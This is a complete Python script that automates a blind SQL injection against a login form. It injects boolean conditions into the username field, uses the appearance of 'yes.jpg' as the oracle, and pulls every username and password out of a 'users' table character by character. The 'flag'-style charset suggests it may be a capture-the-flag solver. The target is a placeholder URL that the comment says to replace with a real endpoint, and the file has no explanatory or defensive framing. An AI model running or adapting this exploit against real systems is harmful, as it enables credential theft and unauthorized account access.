import requests
import string

# ——————————————————————————————————————————————————————————————
# CONFIGURATION
TARGET_URL = "https://example.com/"  # ← replace with real endpoint
REPO_URL   = "https://github.com/yourusername/your-repo"
# ——————————————————————————————————————————————————————————————

CHARSET_USER = string.ascii_lowercase + string.digits + "_"
CHARSET_PASS = string.ascii_letters + string.digits + "_{}"

def check(cond: str) -> bool:
    """Injects a blind‑SQLi condition and returns True if the server shows yes.jpg."""
    data = {
        "uname": f"' OR ({cond})-- ",
        "psw":   "x"
    }
    resp = requests.post(TARGET_URL, data=data)
    return "yes.jpg" in resp.text

def count_rows(table: str) -> int:
    for n in range(1, 50):
        if check(f"(SELECT count(*) FROM {table})={n}"):
            return n
    raise RuntimeError(f"Row count for {table} failed")

def extract_by_offset(table: str, column: str, idx: int, charset: str) -> str:
    # determine length
    for length in range(1, 50):
        if check(f"length((SELECT {column} FROM {table} LIMIT 1 OFFSET {idx}))={length}"):
            break
    else:
        raise RuntimeError("Failed to detect length")
    # fetch characters
    result = ""
    for pos in range(1, length+1):
        for ch in charset:
            cond = (f"substr((SELECT {column} FROM {table} LIMIT 1 OFFSET {idx}),"
                    f"{pos},1)='{ch}'")
            if check(cond):
                result += ch
                break
    return result

def extract_by_key(table: str, column: str, key_col: str, key: str, charset: str) -> str:
    # determine length for a given row
    for length in range(1, 100):
        if check(f"length((SELECT {column} FROM {table} WHERE {key_col}='{key}'))={length}"):
            break
    else:
        raise RuntimeError("Failed to detect length")
    # fetch characters
    result = ""
    for pos in range(1, length+1):
        for ch in charset:
            cond = (f"substr((SELECT {column} FROM {table} WHERE {key_col}='{key}'),"
                    f"{pos},1)='{ch}'")
            if check(cond):
                result += ch
                break
    return result

def main():
    user_count = count_rows("users")
    print(f"→ Found {user_count} rows in users")

    users = [
        extract_by_offset("users", "user__name", i, CHARSET_USER)
        for i in range(user_count)
    ]
    print(f"→ Discovered usernames: {users}")

    for u in users:
        pw = extract_by_key("users", "passwd", "user__name", u, CHARSET_PASS)
        print(f"→ {u} : {pw}")

if __name__ == "__main__":
    main()
